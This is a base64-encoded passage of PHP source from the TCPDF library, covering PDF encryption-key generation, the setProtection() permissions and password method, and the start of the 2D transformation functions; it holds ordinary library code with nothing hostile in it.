FdmFsdWUoKTsKCQkJCS8vIENvbXB1dGUgTyB2YWx1ZQoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydPJ10gPSAkdGhpcy0+X092YWx1ZSgpOwoJCQkJLy8gQ29tcHV0ZSBPRSB2YWx1ZQoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydPRSddID0gJHRoaXMtPl9PRXZhbHVlKCk7CgkJCQkvLyBDb21wdXRlIFAgdmFsdWUKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnUCddID0gJHRoaXMtPmVuY3J5cHRkYXRhWydwcm90ZWN0aW9uJ107CgkJCQkvLyBDb21wdXRpbmcgdGhlIGVuY3J5cHRpb24gZGljdGlvbmFyeSdzIFBlcm1zIChwZXJtaXNzaW9ucykgdmFsdWUKCQkJCSRwZXJtcyA9IFRDUERGX1NUQVRJQzo6Z2V0RW5jUGVybWlzc2lvbnNTdHJpbmcoJHRoaXMtPmVuY3J5cHRkYXRhWydwcm90ZWN0aW9uJ10pOyAvLyBieXRlcyAwLTMKCQkJCSRwZXJtcyAuPSBjaHIoMjU1KS5jaHIoMjU1KS5jaHIoMjU1KS5jaHIoMjU1KTsgLy8gYnl0ZXMgNC03CgkJCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydFbmNyeXB0TWV0YWRhdGEnXSkgQU5EICghJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydFbmNyeXB0TWV0YWRhdGEnXSkpIHsgLy8gYnl0ZSA4CgkJCQkJJHBlcm1zIC49ICdGJzsKCQkJCX0gZWxzZSB7CgkJCQkJJHBlcm1zIC49ICdUJzsKCQkJCX0KCQkJCSRwZXJtcyAuPSAnYWRiJzsgLy8gYnl0ZXMgOS0xMQoJCQkJJHBlcm1zIC49ICduaWNrJzsgLy8gYnl0ZXMgMTItMTUKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsncGVybXMnXSA9IFRDUERGX1NUQVRJQzo6X0FFU25vcGFkKCR0aGlzLT5lbmNyeXB0ZGF0YVsna2V5J10sICRwZXJtcyk7CgkJCX0gZWxzZSB7IC8vIFJDNC00MCwgUkM0LTEyOCwgQUVTLTEyOAoJCQkJLy8gUGFkIHBhc3N3b3JkcwoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWyd1c2VyX3Bhc3N3b3JkJ10gPSBzdWJzdHIoJHRoaXMtPmVuY3J5cHRkYXRhWyd1c2VyX3Bhc3N3b3JkJ10uVENQREZfU1RBVElDOjokZW5jX3BhZGRpbmcsIDAsIDMyKTsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnb3duZXJfcGFzc3dvcmQnXSA9IHN1YnN0cigkdGhpcy0+ZW5jcnlwdGRhdGFbJ293bmVyX3Bhc3N3b3JkJ10uVENQREZfU1RBVElDOjokZW5jX3BhZGRpbmcsIDAsIDMyKTsKCQkJCS8vIENvbXB1dGUgTyB2YWx1ZQoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydPJ10gPSAkdGhpcy0+X092YWx1ZSgpOwoJCQkJLy8gZ2V0IGRlZmF1bHQgcGVybWlzc2lvbnMgKHJldmVyc2UgYnl0ZSBvcmRlcikKCQkJCSRwZXJtaXNzaW9ucyA9IFRDUERGX1NUQVRJQzo6Z2V0RW5jUGVybWlzc2lvbnNTdHJpbmcoJHRoaXMtPmVuY3J5cHRkYXRhWydwcm90ZWN0aW9uJ10pOwoJCQkJLy8gQ29tcHV0ZSBlbmNyeXB0aW9uIGtleQoJCQkJJHRtcCA9IFRDUERGX1NUQVRJQzo6X21kNV8xNigkdGhpcy0+ZW5jcnlwdGRhdGFbJ3VzZXJfcGFzc3dvcmQnXS4kdGhpcy0+ZW5jcnlwdGRhdGFbJ08nXS4kcGVybWlzc2lvbnMuJHRoaXMtPmVuY3J5cHRkYXRhWydmaWxlaWQnXSk7CgkJCQlpZiAoJHRoaXMtPmVuY3J5cHRkYXRhWydtb2RlJ10gPiAwKSB7CgkJCQkJZm9yICgkaSA9IDA7ICRpIDwgNTA7ICsrJGkpIHsKCQkJCQkJJHRtcCA9IFRDUERGX1NUQVRJQzo6X21kNV8xNihzdWJzdHIoJHRtcCwgMCwgJGtleWJ5dGVsZW4pKTsKCQkJCQl9CgkJCQl9CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ2tleSddID0gc3Vic3RyKCR0bXAsIDAsICRrZXlieXRlbGVuKTsKCQkJCS8vIENvbXB1dGUgVSB2YWx1ZQoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydVJ10gPSAkdGhpcy0+X1V2YWx1ZSgpOwoJCQkJLy8gQ29tcHV0ZSBQIHZhbHVlCgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1AnXSA9ICR0aGlzLT5lbmNyeXB0ZGF0YVsncHJvdGVjdGlvbiddOwoJCQl9CgkJfSBlbHNlIHsgLy8gUHVibGljLUtleSBtb2RlCgkJCS8vIHJhbmRvbSAyMC1ieXRlIHNlZWQKCQkJJHNlZWQgPSBzaGExKFRDUERGX1NUQVRJQzo6Z2V0UmFuZG9tU2VlZCgpLCB0cnVlKTsKCQkJJHJlY2lwaWVudF9ieXRlcyA9ICcnOwoJCQlmb3JlYWNoICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleXMnXSBhcyAkcHVia2V5KSB7CgkJCQkvLyBmb3IgZWFjaCBwdWJsaWMgY2VydGlmaWNhdGUKCQkJCWlmIChpc3NldCgkcHVia2V5WydwJ10pKSB7CgkJCQkJJHBrcHJvdGVjdGlvbiA9IFRDUERGX1NUQVRJQzo6Z2V0VXNlclBlcm1pc3Npb25Db2RlKCRwdWJrZXlbJ3AnXSwgJHRoaXMtPmVuY3J5cHRkYXRhWydtb2RlJ10pOwoJCQkJfSBlbHNlIHsKCQkJCQkkcGtwcm90ZWN0aW9uID0gJHRoaXMtPmVuY3J5cHRkYXRhWydwcm90ZWN0aW9uJ107CgkJCQl9CgkJCQkvLyBnZXQgZGVmYXVsdCBwZXJtaXNzaW9ucyAocmV2ZXJzZSBieXRlIG9yZGVyKQoJCQkJJHBrcGVybWlzc2lvbnMgPSBUQ1BERl9TVEFUSUM6OmdldEVuY1Blcm1pc3Npb25zU3RyaW5nKCRwa3Byb3RlY3Rpb24pOwoJCQkJLy8gZW52ZWxvcGUgZGF0YQoJCQkJJGVudmVsb3BlID0gJHNlZWQuJHBrcGVybWlzc2lvbnM7CgkJCQkvLyB3cml0ZSB0aGUgZW52ZWxvcGUgZGF0YSB0byBhIHRlbXBvcmFyeSBmaWxlCgkJCQkkdGVtcGtleWZpbGUgPSBUQ1BERl9TVEFUSUM6OmdldE9iakZpbGVuYW1lKCdrZXknLCAkdGhpcy0+ZmlsZV9pZCk7CgkJCQkkZiA9IFRDUERGX1NUQVRJQzo6Zm9wZW5Mb2NhbCgkdGVtcGtleWZpbGUsICd3YicpOwoJCQkJaWYgKCEkZikgewoJCQkJCSR0aGlzLT5FcnJvcignVW5hYmxlIHRvIGNyZWF0ZSB0ZW1wb3Jhcnkga2V5IGZpbGU6ICcuJHRlbXBrZXlmaWxlKTsKCQkJCX0KCQkJCSRlbnZlbG9wZV9sZW5ndGggPSBzdHJsZW4oJGVudmVsb3BlKTsKCQkJCWZ3cml0ZSgkZiwgJGVudmVsb3BlLCAkZW52ZWxvcGVfbGVuZ3RoKTsKCQkJCWZjbG9zZSgkZik7CgkJCQkkdGVtcGVuY2ZpbGUgPSBUQ1BERl9TVEFUSUM6OmdldE9iakZpbGVuYW1lKCdlbmMnLCAkdGhpcy0+ZmlsZV9pZCk7CgkJCQlpZiAoIW9wZW5zc2xfcGtjczdfZW5jcnlwdCgkdGVtcGtleWZpbGUsICR0ZW1wZW5jZmlsZSwgJHB1YmtleVsnYyddLCBhcnJheSgpLCBQS0NTN19CSU5BUlkgfCBQS0NTN19ERVRBQ0hFRCkpIHsKCQkJCQkkdGhpcy0+RXJyb3IoJ1VuYWJsZSB0byBlbmNyeXB0IHRoZSBmaWxlOiAnLiR0ZW1wa2V5ZmlsZSk7CgkJCQl9CgkJCQkvLyByZWFkIGVuY3J5cHRpb24gc2lnbmF0dXJlCgkJCQkkc2lnbmF0dXJlID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBlbmNmaWxlLCBmYWxzZSwgbnVsbCwgJGVudmVsb3BlX2xlbmd0aCk7CgkJCQkvLyBleHRyYWN0IHNpZ25hdHVyZQoJCQkJJHNpZ25hdHVyZSA9IHN1YnN0cigkc2lnbmF0dXJlLCBzdHJwb3MoJHNpZ25hdHVyZSwgJ0NvbnRlbnQtRGlzcG9zaXRpb24nKSk7CgkJCQkkdG1wYXJyID0gZXhwbG9kZSgiXG5cbiIsICRzaWduYXR1cmUpOwoJCQkJJHNpZ25hdHVyZSA9IHRyaW0oJHRtcGFyclsxXSk7CgkJCQl1bnNldCgkdG1wYXJyKTsKCQkJCS8vIGRlY29kZSBzaWduYXR1cmUKCQkJCSRzaWduYXR1cmUgPSBiYXNlNjRfZGVjb2RlKCRzaWduYXR1cmUpOwoJCQkJLy8gY29udmVydCBzaWduYXR1cmUgdG8gaGV4CgkJCQkkaGV4c2lnbmF0dXJlID0gY3VycmVudCh1bnBhY2soJ0gqJywgJHNpZ25hdHVyZSkpOwoJCQkJLy8gc3RvcmUgc2lnbmF0dXJlIG9uIHJlY2lwaWVudHMgYXJyYXkKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnUmVjaXBpZW50cyddW10gPSAkaGV4c2lnbmF0dXJlOwoJCQkJLy8gVGhlIGJ5dGVzIG9mIGVhY2ggaXRlbSBpbiB0aGUgUmVjaXBpZW50cyBhcnJheSBvZiBQS0NTIzcgb2JqZWN0cyBpbiB0aGUgb3JkZXIgaW4gd2hpY2ggdGhleSBhcHBlYXIgaW4gdGhlIGFycmF5CgkJCQkkcmVjaXBpZW50X2J5dGVzIC49ICRzaWduYXR1cmU7CgkJCX0KCQkJLy8gY2FsY3VsYXRlIGVuY3J5cHRpb24ga2V5CgkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSA9PSAzKSB7IC8vIEFFUy0yNTYKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsna2V5J10gPSBzdWJzdHIoaGFzaCgnc2hhMjU2JywgJHNlZWQuJHJlY2lwaWVudF9ieXRlcywgdHJ1ZSksIDAsICRrZXlieXRlbGVuKTsKCQkJfSBlbHNlIHsgLy8gUkM0LTQwLCBSQzQtMTI4LCBBRVMtMTI4CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ2tleSddID0gc3Vic3RyKHNoYTEoJHNlZWQuJHJlY2lwaWVudF9ieXRlcywgdHJ1ZSksIDAsICRrZXlieXRlbGVuKTsKCQkJfQoJCX0KCX0KCgkvKioKCSAqIFNldCBkb2N1bWVudCBwcm90ZWN0aW9uCgkgKiBSZW1hcms6IHRoZSBwcm90ZWN0aW9uIGFnYWluc3QgbW9kaWZpY2F0aW9uIGlzIGZvciBwZW9wbGUgd2hvIGhhdmUgdGhlIGZ1bGwgQWNyb2JhdCBwcm9kdWN0LgoJICogSWYgeW91IGRvbid0IHNldCBhbnkgcGFzc3dvcmQsIHRoZSBkb2N1bWVudCB3aWxsIG9wZW4gYXMgdXN1YWwuIElmIHlvdSBzZXQgYSB1c2VyIHBhc3N3b3JkLCB0aGUgUERGIHZpZXdlciB3aWxsIGFzayBmb3IgaXQgYmVmb3JlIGRpc3BsYXlpbmcgdGhlIGRvY3VtZW50LiBUaGUgbWFzdGVyIHBhc3N3b3JkLCBpZiBkaWZmZXJlbnQgZnJvbSB0aGUgdXNlciBvbmUsIGNhbiBiZSB1c2VkIHRvIGdldCBmdWxsIGFjY2Vzcy4KCSAqIE5vdGU6IHByb3RlY3RpbmcgYSBkb2N1bWVudCByZXF1aXJlcyB0byBlbmNyeXB0IGl0LCB3aGljaCBpbmNyZWFzZXMgdGhlIHByb2Nlc3NpbmcgdGltZSBhIGxvdC4gVGhpcyBjYW4gY2F1c2UgYSBQSFAgdGltZS1vdXQgaW4gc29tZSBjYXNlcywgZXNwZWNpYWxseSBpZiB0aGUgZG9jdW1lbnQgY29udGFpbnMgaW1hZ2VzIG9yIGZvbnRzLgoJICogQHBhcmFtIGFycmF5ICRwZXJtaXNzaW9ucyB0aGUgc2V0IG9mIHBlcm1pc3Npb25zIChzcGVjaWZ5IHRoZSBvbmVzIHlvdSB3YW50IHRvIGJsb2NrKTo8dWw+PGxpPnByaW50IDogUHJpbnQgdGhlIGRvY3VtZW50OzwvbGk+PGxpPm1vZGlmeSA6IE1vZGlmeSB0aGUgY29udGVudHMgb2YgdGhlIGRvY3VtZW50IGJ5IG9wZXJhdGlvbnMgb3RoZXIgdGhhbiB0aG9zZSBjb250cm9sbGVkIGJ5ICdmaWxsLWZvcm1zJywgJ2V4dHJhY3QnIGFuZCAnYXNzZW1ibGUnOzwvbGk+PGxpPmNvcHkgOiBDb3B5IG9yIG90aGVyd2lzZSBleHRyYWN0IHRleHQgYW5kIGdyYXBoaWNzIGZyb20gdGhlIGRvY3VtZW50OzwvbGk+PGxpPmFubm90LWZvcm1zIDogQWRkIG9yIG1vZGlmeSB0ZXh0IGFubm90YXRpb25zLCBmaWxsIGluIGludGVyYWN0aXZlIGZvcm0gZmllbGRzLCBhbmQsIGlmICdtb2RpZnknIGlzIGFsc28gc2V0LCBjcmVhdGUgb3IgbW9kaWZ5IGludGVyYWN0aXZlIGZvcm0gZmllbGRzIChpbmNsdWRpbmcgc2lnbmF0dXJlIGZpZWxkcyk7PC9saT48bGk+ZmlsbC1mb3JtcyA6IEZpbGwgaW4gZXhpc3RpbmcgaW50ZXJhY3RpdmUgZm9ybSBmaWVsZHMgKGluY2x1ZGluZyBzaWduYXR1cmUgZmllbGRzKSwgZXZlbiBpZiAnYW5ub3QtZm9ybXMnIGlzIG5vdCBzcGVjaWZpZWQ7PC9saT48bGk+ZXh0cmFjdCA6IEV4dHJhY3QgdGV4dCBhbmQgZ3JhcGhpY3MgKGluIHN1cHBvcnQgb2YgYWNjZXNzaWJpbGl0eSB0byB1c2VycyB3aXRoIGRpc2FiaWxpdGllcyBvciBmb3Igb3RoZXIgcHVycG9zZXMpOzwvbGk+PGxpPmFzc2VtYmxlIDogQXNzZW1ibGUgdGhlIGRvY3VtZW50IChpbnNlcnQsIHJvdGF0ZSwgb3IgZGVsZXRlIHBhZ2VzIGFuZCBjcmVhdGUgYm9va21hcmtzIG9yIHRodW1ibmFpbCBpbWFnZXMpLCBldmVuIGlmICdtb2RpZnknIGlzIG5vdCBzZXQ7PC9saT48bGk+cHJpbnQtaGlnaCA6IFByaW50IHRoZSBkb2N1bWVudCB0byBhIHJlcHJlc2VudGF0aW9uIGZyb20gd2hpY2ggYSBmYWl0aGZ1bCBkaWdpdGFsIGNvcHkgb2YgdGhlIFBERiBjb250ZW50IGNvdWxkIGJlIGdlbmVyYXRlZC4gV2hlbiB0aGlzIGlzIG5vdCBzZXQsIHByaW50aW5nIGlzIGxpbWl0ZWQgdG8gYSBsb3ctbGV2ZWwgcmVwcmVzZW50YXRpb24gb2YgdGhlIGFwcGVhcmFuY2UsIHBvc3NpYmx5IG9mIGRlZ3JhZGVkIHF1YWxpdHkuPC9saT48bGk+b3duZXIgOiAoaW52ZXJ0ZWQgbG9naWMgLSBvbmx5IGZvciBwdWJsaWMta2V5KSB3aGVuIHNldCBwZXJtaXRzIGNoYW5nZSBvZiBlbmNyeXB0aW9uIGFuZCBlbmFibGVzIGFsbCBvdGhlciBwZXJtaXNzaW9ucy48L2xpPjwvdWw+CgkgKiBAcGFyYW0gc3RyaW5nICR1c2VyX3Bhc3MgdXNlciBwYXNzd29yZC4gRW1wdHkgYnkgZGVmYXVsdC4KCSAqIEBwYXJhbSBzdHJpbmd8bnVsbCAkb3duZXJfcGFzcyBvd25lciBwYXNzd29yZC4gSWYgbm90IHNwZWNpZmllZCwgYSByYW5kb20gdmFsdWUgaXMgdXNlZC4KCSAqIEBwYXJhbSBpbnQgJG1vZGUgZW5jcnlwdGlvbiBzdHJlbmd0aDogMCA9IFJDNCA0MCBiaXQ7IDEgPSBSQzQgMTI4IGJpdDsgMiA9IEFFUyAxMjggYml0OyAzID0gQUVTIDI1NiBiaXQuCgkgKiBAcGFyYW0gYXJyYXl8bnVsbCAkcHVia2V5cyBhcnJheSBvZiByZWNpcGllbnRzIGNvbnRhaW5pbmcgcHVibGljLWtleSBjZXJ0aWZpY2F0ZXMgKCdjJykgYW5kIHBlcm1pc3Npb25zICgncCcpLiBGb3IgZXhhbXBsZTogYXJyYXkoYXJyYXkoJ2MnID0+ICdmaWxlOi8vLi4vZXhhbXBsZXMvZGF0YS9jZXJ0L3RjcGRmLmNydCcsICdwJyA9PiBhcnJheSgncHJpbnQnKSkpCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4wLjAwMCAoMjAwOC0wMS0wMikKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRQcm90ZWN0aW9uKCRwZXJtaXNzaW9ucz1hcnJheSgncHJpbnQnLCAnbW9kaWZ5JywgJ2NvcHknLCAnYW5ub3QtZm9ybXMnLCAnZmlsbC1mb3JtcycsICdleHRyYWN0JywgJ2Fzc2VtYmxlJywgJ3ByaW50LWhpZ2gnKSwgJHVzZXJfcGFzcz0nJywgJG93bmVyX3Bhc3M9bnVsbCwgJG1vZGU9MCwgJHB1YmtleXM9bnVsbCkgewoJCWlmICgkdGhpcy0+cGRmYV9tb2RlKSB7CgkJCS8vIGVuY3J5cHRpb24gaXMgbm90IGFsbG93ZWQgaW4gUERGL0EgbW9kZQoJCQlyZXR1cm47CgkJfQoJCSR0aGlzLT5lbmNyeXB0ZGF0YVsncHJvdGVjdGlvbiddID0gVENQREZfU1RBVElDOjpnZXRVc2VyUGVybWlzc2lvbkNvZGUoJHBlcm1pc3Npb25zLCAkbW9kZSk7CgkJaWYgKCgkcHVia2V5cyAhPT0gbnVsbCkgQU5EIChpc19hcnJheSgkcHVia2V5cykpKSB7CgkJCS8vIHB1YmxpYy1rZXkgbW9kZQoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleXMnXSA9ICRwdWJrZXlzOwoJCQlpZiAoJG1vZGUgPT0gMCkgewoJCQkJLy8gcHVibGljLUtleSBTZWN1cml0eSByZXF1aXJlcyBhdCBsZWFzdCAxMjggYml0CgkJCQkkbW9kZSA9IDE7CgkJCX0KCQkJaWYgKCFmdW5jdGlvbl9leGlzdHMoJ29wZW5zc2xfcGtjczdfZW5jcnlwdCcpKSB7CgkJCQkkdGhpcy0+RXJyb3IoJ1B1YmxpYy1LZXkgU2VjdXJpdHkgcmVxdWlyZXMgb3BlbnNzbCBsaWJyYXJ5LicpOwoJCQl9CgkJCS8vIFNldCBQdWJsaWMtS2V5IGZpbHRlciAoYXZhaWxhYmxlIGFyZTogRW50cnVzdC5QUEtFRiwgQWRvYmUuUFBLTGl0ZSwgQWRvYmUuUHViU2VjKQoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleSddID0gdHJ1ZTsKCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydGaWx0ZXInXSA9ICdBZG9iZS5QdWJTZWMnOwoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1N0bUYnXSA9ICdEZWZhdWx0Q3J5cHRGaWx0ZXInOwoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1N0ckYnXSA9ICdEZWZhdWx0Q3J5cHRGaWx0ZXInOwoJCX0gZWxzZSB7CgkJCS8vIHN0YW5kYXJkIG1vZGUgKHBhc3N3b3JkIG1vZGUpCgkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsncHVia2V5J10gPSBmYWxzZTsKCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydGaWx0ZXInXSA9ICdTdGFuZGFyZCc7CgkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnU3RtRiddID0gJ1N0ZENGJzsKCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydTdHJGJ10gPSAnU3RkQ0YnOwoJCX0KCQlpZiAoJG1vZGUgPiAxKSB7IC8vIEFFUwoJCQlpZiAoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSAmJiAhZXh0ZW5zaW9uX2xvYWRlZCgnbWNyeXB0JykpIHsKCQkJCSR0aGlzLT5FcnJvcignQUVTIGVuY3J5cHRpb24gcmVxdWlyZXMgb3BlbnNzbCBvciBtY3J5cHQgZXh0ZW5zaW9uIChodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL21jcnlwdC5yZXF1aXJlbWVudHMucGhwKS4nKTsKCQkJfQoJCQlpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpICYmICFpbl9hcnJheSgnYWVzLTI1Ni1jYmMnLCBvcGVuc3NsX2dldF9jaXBoZXJfbWV0aG9kcygpKSkgewoJCQkJJHRoaXMtPkVycm9yKCdBRVMgZW5jcnlwdGlvbiByZXF1aXJlcyBvcGVuc3NsL2Flcy0yNTYtY2JjIGN5cGhlci4nKTsKCQkJfQoJCQlpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnbWNyeXB0JykgJiYgbWNyeXB0X2dldF9jaXBoZXJfbmFtZShNQ1JZUFRfUklKTkRBRUxfMTI4KSA9PT0gZmFsc2UpIHsKCQkJCSR0aGlzLT5FcnJvcignQUVTIGVuY3J5cHRpb24gcmVxdWlyZXMgTUNSWVBUX1JJSk5EQUVMXzEyOCBjeXBoZXIuJyk7CgkJCX0KCQkJaWYgKCgkbW9kZSA9PSAzKSBBTkQgIWZ1bmN0aW9uX2V4aXN0cygnaGFzaCcpKSB7CgkJCQkvLyB0aGUgSGFzaCBleHRlbnNpb24gcmVxdWlyZXMgbm8gZXh0ZXJuYWwgbGlicmFyaWVzIGFuZCBpcyBlbmFibGVkIGJ5IGRlZmF1bHQgYXMgb2YgUEhQIDUuMS4yLgoJCQkJJHRoaXMtPkVycm9yKCdBRVMgMjU2IGVuY3J5cHRpb24gcmVxdWlyZXMgSEFTSCBNZXNzYWdlIERpZ2VzdCBGcmFtZXdvcmsgKGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vYm9vay5oYXNoLnBocCkuJyk7CgkJCX0KCQl9CgkJaWYgKCRvd25lcl9wYXNzID09PSBudWxsKSB7CgkJCSRvd25lcl9wYXNzID0gbWQ1KFRDUERGX1NUQVRJQzo6Z2V0UmFuZG9tU2VlZCgpKTsKCQl9CgkJJHRoaXMtPmVuY3J5cHRkYXRhWyd1c2VyX3Bhc3N3b3JkJ10gPSAkdXNlcl9wYXNzOwoJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnb3duZXJfcGFzc3dvcmQnXSA9ICRvd25lcl9wYXNzOwoJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddID0gJG1vZGU7CgkJc3dpdGNoICgkbW9kZSkgewoJCQljYXNlIDA6IHsgLy8gUkM0IDQwIGJpdAoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydWJ10gPSAxOwoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydMZW5ndGgnXSA9IDQwOwoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydDRk0nXSA9ICdWMic7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDE6IHsgLy8gUkM0IDEyOCBiaXQKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnViddID0gMjsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnTGVuZ3RoJ10gPSAxMjg7CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0NGTSddID0gJ1YyJzsKCQkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleSddKSB7CgkJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydTdWJGaWx0ZXInXSA9ICdhZGJlLnBrY3M3LnM0JzsKCQkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1JlY2lwaWVudHMnXSA9IGFycmF5KCk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDI6IHsgLy8gQUVTIDEyOCBiaXQKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnViddID0gNDsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnTGVuZ3RoJ10gPSAxMjg7CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0NGTSddID0gJ0FFU1YyJzsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnQ0YnXVsnTGVuZ3RoJ10gPSAxNjsKCQkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleSddKSB7CgkJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydTdWJGaWx0ZXInXSA9ICdhZGJlLnBrY3M3LnM1JzsKCQkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1JlY2lwaWVudHMnXSA9IGFycmF5KCk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDM6IHsgLy8gQUVTIDI1NiBiaXQKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnViddID0gNTsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnTGVuZ3RoJ10gPSAyNTY7CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0NGTSddID0gJ0FFU1YzJzsKCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnQ0YnXVsnTGVuZ3RoJ10gPSAzMjsKCQkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleSddKSB7CgkJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydTdWJGaWx0ZXInXSA9ICdhZGJlLnBrY3M3LnM1JzsKCQkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1JlY2lwaWVudHMnXSA9IGFycmF5KCk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCX0KCQkkdGhpcy0+ZW5jcnlwdGVkID0gdHJ1ZTsKCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ2ZpbGVpZCddID0gVENQREZfU1RBVElDOjpjb252ZXJ0SGV4U3RyaW5nVG9TdHJpbmcoJHRoaXMtPmZpbGVfaWQpOwoJCSR0aGlzLT5fZ2VuZXJhdGVlbmNyeXB0aW9ua2V5KCk7Cgl9CgoJLy8gRU5EIE9GIEVOQ1JZUFRJT04gRlVOQ1RJT05TIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgkvLyBTVEFSVCBUUkFOU0ZPUk1BVElPTlMgU0VDVElPTiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKCS8qKgoJICogU3RhcnRzIGEgMkQgdHJhbmZvcm1hdGlvbiBzYXZpbmcgY3VycmVudCBncmFwaGljIHN0YXRlLgoJICogVGhpcyBmdW5jdGlvbiBtdXN0IGJlIGNhbGxlZCBiZWZvcmUgc2NhbGluZywgbWlycm9yaW5nLCB0cmFuc2xhdGlvbiwgcm90YXRpb24gYW5kIHNrZXdpbmcuCgkgKiBVc2UgU3RhcnRUcmFuc2Zvcm0oKSBiZWZvcmUsIGFuZCBTdG9wVHJhbnNmb3JtKCkgYWZ0ZXIgdGhlIHRyYW5zZm9ybWF0aW9ucyB0byByZXN0b3JlIHRoZSBub3JtYWwgYmVoYXZpb3IuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wNykKCSAqIEBzZWUgU3RhcnRUcmFuc2Zvcm0oKSwgU3RvcFRyYW5zZm9ybSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBTdGFydFRyYW5zZm9ybSgpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQkkdGhpcy0+X291dFNhdmVHcmFwaGljc1N0YXRlKCk7CgkJaWYgKCR0aGlzLT5pbnhvYmopIHsKCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCSR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsndHJhbnNmbXJrJ11bXSA9IHN0cmxlbigkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnRyYW5zZm1ya1skdGhpcy0+cGFnZV1bXSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXTsKCQl9CgkJKyskdGhpcy0+dHJhbnNmbWF0cml4X2tleTsKCQkkdGhpcy0+dHJhbnNmbWF0cml4WyR0aGlzLT50cmFuc2ZtYXRyaXhfa2V5XSA9IGFycmF5KCk7Cgl9CgoJLyoqCgkgKiBTdG9wcyBhIDJEIHRyYW5mb3JtYXRpb24gcmVzdG9yaW5nIHByZXZpb3VzIGdyYXBoaWMgc3RhdGUuCgkgKiBUaGlzIGZ1bmN0aW9uIG11c3QgYmUgY2FsbGVkIGFmdGVyIHNjYWxpbmcsIG1pcnJvcmluZywgdHJhbnNsYXRpb24sIHJvdGF0aW9uIGFuZCBza2V3aW5nLgoJICogVXNlIFN0YXJ0VHJhbnNmb3JtKCkgYmVmb3JlLCBhbmQgU3RvcFRyYW5zZm9ybSgpIGFmdGVyIHRoZSB0cmFuc2Zvcm1hdGlvbnMgdG8gcmVzdG9yZSB0aGUgbm9ybWFsIG